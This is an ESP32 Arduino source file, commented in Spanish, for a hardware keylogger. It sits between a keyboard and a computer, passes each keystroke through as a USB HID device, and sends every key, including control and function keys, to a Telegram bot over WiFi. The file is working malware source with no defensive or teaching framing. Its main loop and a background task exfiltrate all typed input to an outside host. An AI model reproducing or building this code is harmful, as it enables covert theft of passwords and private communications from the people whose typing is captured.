// ===== Librerías y configuración general =====
#include "USB.h"
#include "USBHIDKeyboard.h"
#include <WiFi.h>
#include <HTTPClient.h>
#include <WiFiClientSecure.h>
#include "freertos/queue.h"

USBHIDKeyboard Keyboard;

// ===== Pines y velocidad UART =====
#define RX_PIN 18
#define TX_PIN 17
#define BAUD_RATE 9600

// ===== Credenciales WiFi =====
const char* ssid     = "";        // Nombre de la red WiFi a la que se conectará
const char* password = "";        // Contraseña de la red WiFi

// ===== Credenciales Telegram =====
String botToken = "";             // Token del bot de Telegram para enviar mensajes
String chatID   = "";             // ID del chat de Telegram donde se enviarán los mensajes

// ===== Definición de comandos especiales =====
#define CMD_ESC        0x1B
#define CMD_TAB        0x09
#define CMD_CAPS       0x14
#define CMD_BACKSPACE  0x08
#define CMD_ENTER      0x0A
#define CMD_GUI        0x90
#define CMD_ALTGR      0x92

#define CMD_CTRL_C 0xA1
#define CMD_CTRL_V 0xA2
#define CMD_CTRL_X 0xA3
#define CMD_CTRL_Z 0xA4

#define CMD_ARROW_UP     0xA5
#define CMD_ARROW_DOWN   0xA6
#define CMD_ARROW_LEFT   0xA7
#define CMD_ARROW_RIGHT  0xA8

// ===== Teclado numérico =====
#define KP_0       0xB0
#define KP_1       0xB1
#define KP_2       0xB2
#define KP_3       0xB3
#define KP_4       0xB4
#define KP_5       0xB5
#define KP_6       0xB6
#define KP_7       0xB7
#define KP_8       0xB8
#define KP_9       0xB9
#define KP_DOT     0xBA
#define KP_ENTER   0xBB
#define KP_PLUS    0xBC
#define KP_MINUS   0xBD
#define KP_MULT    0xBE
#define KP_DIV     0xBF

// ===== Teclas de función F1-F12 =====
#define CMD_F1  0xC1
#define CMD_F2  0xC2
#define CMD_F3  0xC3
#define CMD_F4  0xC4
#define CMD_F5  0xC5
#define CMD_F6  0xC6
#define CMD_F7  0xC7
#define CMD_F8  0xC8
#define CMD_F9  0xC9
#define CMD_F10 0xCA
#define CMD_F11 0xCB
#define CMD_F12 0xCC

// ===== Mapeo de comandos a keycodes =====
typedef struct {
  uint8_t command;
  uint8_t keycode;
} CommandMap;

CommandMap commandMap[] = {
  {CMD_ESC,       KEY_ESC},
  {CMD_TAB,       KEY_TAB},
  {CMD_CAPS,      KEY_CAPS_LOCK},
  {CMD_BACKSPACE, KEY_BACKSPACE},
  {CMD_ENTER,     KEY_RETURN}
};

const uint8_t commandCount = sizeof(commandMap) / sizeof(CommandMap);

// ===== Cola para enviar teclas a Telegram =====
#define KEYBUF_LEN 128
#define QUEUE_SIZE 32
QueueHandle_t keyQueue;

// ===== Codificación URL de caracteres especiales =====
String urlEncode(const char* input) {
  String out = "";
  for (size_t i = 0; input[i] != '\0'; ++i) {
    uint8_t c = (uint8_t)input[i];
    if (isalnum(c)) {
      out += (char)c;
    } else {
      char tmp[4];
      sprintf(tmp, "%%%02X", c);
      out += tmp;
    }
  }
  return out;
}

// ===== Envío de teclas a la cola =====
void sendLater(const String& key) {
  char buf[KEYBUF_LEN];
  key.toCharArray(buf, KEYBUF_LEN);
  xQueueSend(keyQueue, buf, 0);
}

// ===== Tarea de envío a Telegram =====
void serverTask(void* parameter) {
  char keyBuf[KEYBUF_LEN];
  WiFiClientSecure client;
  client.setInsecure();
  HTTPClient http;

  for (;;) {
    if (xQueueReceive(keyQueue, &keyBuf, portMAX_DELAY) == pdTRUE) {
      if (WiFi.status() == WL_CONNECTED) {

        String encoded = urlEncode(keyBuf);

        String url =
          "https://api.telegram.org/bot" + botToken +
          "/sendMessage?chat_id=" + chatID +
          "&text=" + encoded;

        http.setTimeout(2000);

        if (http.begin(client, url)) {
          http.GET();
          http.end();
        }
      }
    }
  }
}

// ===== Función para presionar y soltar una tecla =====
void pressAndRelease(uint8_t key) {
  Keyboard.press(key);
  Keyboard.release(key);
}

// ===== Validar si un comando es especial =====
bool isSpecialCommand(uint8_t cmd) {
  if (cmd == CMD_CTRL_C || cmd == CMD_CTRL_V || cmd == CMD_CTRL_X || cmd == CMD_CTRL_Z)
    return true;
  if (cmd == CMD_ARROW_UP || cmd == CMD_ARROW_DOWN || cmd == CMD_ARROW_LEFT || cmd == CMD_ARROW_RIGHT)
    return true;
  if (cmd == CMD_GUI || cmd == CMD_ALTGR)
    return true;
  if (cmd >= CMD_F1 && cmd <= CMD_F12)
    return true;
  for (int i = 0; i < commandCount; i++) {
    if (cmd == commandMap[i].command) return true;
  }
  return false;
}

// ===== Manejo de comandos especiales =====
void handleSpecialCommand(uint8_t cmd) {
  switch (cmd) {
    case KP_0:     pressAndRelease(KEY_KP_0); sendLater("KP_0"); return;
    case KP_1:     pressAndRelease(KEY_KP_1); sendLater("KP_1"); return;
    case KP_2:     pressAndRelease(KEY_KP_2); sendLater("KP_2"); return;
    case KP_3:     pressAndRelease(KEY_KP_3); sendLater("KP_3"); return;
    case KP_4:     pressAndRelease(KEY_KP_4); sendLater("KP_4"); return;
    case KP_5:     pressAndRelease(KEY_KP_5); sendLater("KP_5"); return;
    case KP_6:     pressAndRelease(KEY_KP_6); sendLater("KP_6"); return;
    case KP_7:     pressAndRelease(KEY_KP_7); sendLater("KP_7"); return;
    case KP_8:     pressAndRelease(KEY_KP_8); sendLater("KP_8"); return;
    case KP_9:     pressAndRelease(KEY_KP_9); sendLater("KP_9"); return;

    case KP_DOT:   pressAndRelease(KEY_KP_DOT); sendLater("KP_DOT"); return;
    case KP_ENTER: pressAndRelease(KEY_KP_ENTER); sendLater("KP_ENTER"); return;
    case KP_PLUS:  pressAndRelease(KEY_KP_PLUS); sendLater("KP_PLUS"); return;
    case KP_MINUS: pressAndRelease(KEY_KP_MINUS); sendLater("KP_MINUS"); return;
    case KP_MULT:  pressAndRelease(KEY_KP_ASTERISK); sendLater("KP_MULT"); return;
    case KP_DIV:   pressAndRelease(KEY_KP_SLASH); sendLater("KP_DIV"); return;
  }

  switch(cmd) {
    case CMD_F1:  pressAndRelease(KEY_F1);  sendLater("F1");  return;
    case CMD_F2:  pressAndRelease(KEY_F2);  sendLater("F2");  return;
    case CMD_F3:  pressAndRelease(KEY_F3);  sendLater("F3");  return;
    case CMD_F4:  pressAndRelease(KEY_F4);  sendLater("F4");  return;
    case CMD_F5:  pressAndRelease(KEY_F5);  sendLater("F5");  return;
    case CMD_F6:  pressAndRelease(KEY_F6);  sendLater("F6");  return;
    case CMD_F7:  pressAndRelease(KEY_F7);  sendLater("F7");  return;
    case CMD_F8:  pressAndRelease(KEY_F8);  sendLater("F8");  return;
    case CMD_F9:  pressAndRelease(KEY_F9);  sendLater("F9");  return;
    case CMD_F10: pressAndRelease(KEY_F10); sendLater("F10"); return;
    case CMD_F11: pressAndRelease(KEY_F11); sendLater("F11"); return;
    case CMD_F12: pressAndRelease(KEY_F12); sendLater("F12"); return;
  }

  if (cmd == CMD_CTRL_C){
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press('c');
    Keyboard.release('c');
    Keyboard.release(KEY_LEFT_CTRL);
    sendLater("CTRL+c");
    return;
  }
  if (cmd == CMD_CTRL_V){
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press('v');
    Keyboard.release('v');
    Keyboard.release(KEY_LEFT_CTRL);
    sendLater("CTRL+v");
    return;
  }
  if (cmd == CMD_CTRL_X){
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press('x');
    Keyboard.release('x');
    Keyboard.release(KEY_LEFT_CTRL);
    sendLater("CTRL+x");
    return;
  }
  if (cmd == CMD_CTRL_Z){
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press('z');
    Keyboard.release('z');
    Keyboard.release(KEY_LEFT_CTRL);
    sendLater("CTRL+z");
    return;
  }

  if (cmd == CMD_ARROW_UP) {
    pressAndRelease(KEY_UP_ARROW);
    sendLater("UP");
    return;
  }
  if (cmd == CMD_ARROW_DOWN) {
    pressAndRelease(KEY_DOWN_ARROW);
    sendLater("DOWN");
    return;
  }
  if (cmd == CMD_ARROW_LEFT) {
    pressAndRelease(KEY_LEFT_ARROW);
    sendLater("LEFT");
    return;
  }
  if (cmd == CMD_ARROW_RIGHT) {
    pressAndRelease(KEY_RIGHT_ARROW);
    sendLater("RIGHT");
    return;
  }

  for (int i = 0; i < commandCount; i++) {
    if (cmd == commandMap[i].command) {
      pressAndRelease(commandMap[i].keycode);

      switch (cmd) {
        case CMD_ESC: sendLater("ESC"); break;
        case CMD_TAB: sendLater("TAB"); break;
        case CMD_CAPS: sendLater("CAPS_LOCK"); break;
        case CMD_BACKSPACE: sendLater("BACKSPACE"); break;
        case CMD_ENTER: sendLater("ENTER"); break;
        default: sendLater(String(commandMap[i].keycode)); break;
      }
      return;
    }
  }

  if (cmd == CMD_GUI) {
    pressAndRelease(KEY_LEFT_GUI);
    sendLater("GUI");
  }

  if (cmd == CMD_ALTGR) {
    pressAndRelease(KEY_RIGHT_ALT);
    sendLater("ALTGR");
  }
}

// ===== Configuración inicial del ESP32 =====
void setup() {
  Serial1.begin(BAUD_RATE, SERIAL_8N1, RX_PIN, TX_PIN);

  USB.productName("Teclado Keylogger"); // Nombre Teclado, puedes cambiarlo
  USB.begin();

  Keyboard.begin();
  delay(500);

  WiFi.begin(ssid, password);
  int retries = 0;
  while (WiFi.status() != WL_CONNECTED && retries < 20) {
    delay(500);
    retries++;
  }

  keyQueue = xQueueCreate(QUEUE_SIZE, KEYBUF_LEN);
  if (keyQueue != NULL) {
    xTaskCreatePinnedToCore(serverTask, "ServerTask", 4096, NULL, 1, NULL, 1);
  }
}

// ===== Loop principal para leer UART y enviar teclas =====
void loop() {
  while (Serial1.available()) {
    uint8_t c = Serial1.read();

    if (isSpecialCommand(c)) {
      handleSpecialCommand(c);
      continue;
    }

    if (c == '.') {
      Keyboard.write('.');
      sendLater(".");
      continue;
    }

    if (c == '*') {
      Keyboard.press(KEY_KP_ASTERISK);
      Keyboard.release(KEY_KP_ASTERISK);
      sendLater("*");
      continue;
    }

    if (c == '-') {
      Keyboard.press(KEY_KP_MINUS);
      Keyboard.release(KEY_KP_MINUS);
      sendLater("-");
      continue;
    }

    if (c == '+') {
      Keyboard.press(KEY_KP_PLUS);
      Keyboard.release(KEY_KP_PLUS);
      sendLater("+");
      continue;
    }

    if (c == '/') {
      Keyboard.press(KEY_KP_SLASH);
      Keyboard.release(KEY_KP_SLASH);
      sendLater("/");
      continue;
    }

    if (c == '"') {
      Keyboard.press(KEY_LEFT_SHIFT);
      Keyboard.press('2');
      Keyboard.release('2');
      Keyboard.release(KEY_LEFT_SHIFT);
      sendLater("\"");
      continue;
    }

    if (c == '@') {
      Keyboard.press(KEY_RIGHT_ALT);
      Keyboard.press('q');
      Keyboard.release('q');
      Keyboard.release(KEY_RIGHT_ALT);
      sendLater("@");
      continue;
    }

    if (c >= 0x20 && c <= 0x7E) {
      Keyboard.write((char)c);
      sendLater(String((char)c));
    }
  }

  delay(1);
}
